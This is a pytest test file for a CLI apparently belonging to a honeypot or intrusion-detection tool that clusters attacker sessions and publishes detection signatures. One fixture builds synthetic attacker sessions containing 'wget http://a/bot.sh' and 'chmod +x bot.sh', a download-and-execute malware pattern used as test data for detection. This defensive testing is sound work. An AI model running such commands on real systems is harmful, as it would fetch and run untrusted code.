import json
import os

import pytest

from nexus_shield import cli, sdr, telemetry
from nexus_shield.collector import Collector
from tests.helpers import ev


@pytest.fixture
def jsonl(tmp_path):
    p = tmp_path / "events.jsonl"
    for i in range(5):
        telemetry.append(str(p), ev(["root", "wget http://a/bot.sh", "chmod +x bot.sh"], ts=i * 2.0, ip=f"9.9.9.{i}"))
    return str(p)


@pytest.fixture
def benign(tmp_path):
    p = tmp_path / "benign.jsonl"
    telemetry.append(str(p), ev(["alice", "ls -la", "pwd"], gap=3.0, ip="8.8.8.8"))
    return str(p)


def test_version(capsys):
    with pytest.raises(SystemExit):
        cli.main(["--version"])
    assert "0.3.0" in capsys.readouterr().out


def test_config_sets_defaults(tmp_path):
    cfg = tmp_path / "n.toml"
    cfg.write_text('[collector]\nport = 9999\nnode_tokens = { "n1" = "t" }\n[run]\nnode = "edge"\nmax-conn = 5\n')
    p = cli.build_parser(cli.load_config(str(cfg)))
    c = p.parse_args(["collector"])
    assert c.port == 9999 and c.node_tokens == {"n1": "t"}
    assert p.parse_args(["collector", "--port", "1"]).port == 1  # flags override config
    r = p.parse_args(["run"])
    assert r.node == "edge" and r.max_conn == 5
    assert cli.load_config(None) == {}


def test_report_analyze_and_obs(jsonl, benign, tmp_path, capsys):
    obs = tmp_path / "o.jsonl"
    for i in range(5):
        sdr.save(str(obs), sdr.Obs(i * 2.0 + 0.05, 0, -10, 1000 + i))
    cli.main(["report", jsonl, "--obs", str(obs), "--benign", benign])
    out = capsys.readouterr().out
    assert "Cluster 0: 5 sessions" in out and "emitter-0" in out
    html_path = tmp_path / "r.html"
    cli.main(["report", jsonl, "--format", "html", "--out", str(html_path)])
    assert html_path.read_text().startswith("<!doctype html>")
    cli.main(["analyze", jsonl, "--obs", str(obs)])
    assert "emitter-0" in capsys.readouterr().out


def test_publish_end_to_end(jsonl, benign, capsys):
    c = Collector(token="adm").start()
    try:
        cli.main(["publish", jsonl, "--benign", benign, "--collector", c.url, "--token", "adm"])
        assert "published 1 vaccine" in capsys.readouterr().out
        assert len(c.vaccines) == 1
        cli.main(["publish", jsonl, "--collector", c.url, "--token", "adm"])  # no benign corpus: nothing deploys
        assert "published 0 vaccine" in capsys.readouterr().out
        assert c.vaccines == []
    finally:
        c.stop()


def test_replay_recovers_after_outage(jsonl, capsys):
    with pytest.raises(SystemExit) as e:  # collector down
        cli.main(["replay", jsonl, "--collector", "http://127.0.0.1:9", "--token", "x"])
    assert e.value.code == 1
    c = Collector(token="adm").start()
    try:
        with pytest.raises(SystemExit) as e:
            cli.main(["replay", jsonl, "--collector", c.url, "--token", "adm"])
        assert e.value.code == 0 and len(c.events) == 5
    finally:
        c.stop()


def test_bench_json(capsys):
    cli.main(["bench", "--json"])
    res = json.loads(capsys.readouterr().out)
    assert res["detection"]["vaccine"]["recall"] > res["detection"]["exact_match"]["recall"]


def test_demo_cli(capsys):
    cli.main(["demo"])
    assert "'attribution_ok': True" in capsys.readouterr().out


def test_env_token(monkeypatch):
    monkeypatch.setenv("NEXUS_TOKEN", "fromenv")
    assert cli.build_parser({}).parse_args(["run"]).token == "fromenv"
    assert os.environ["NEXUS_TOKEN"] == "fromenv"
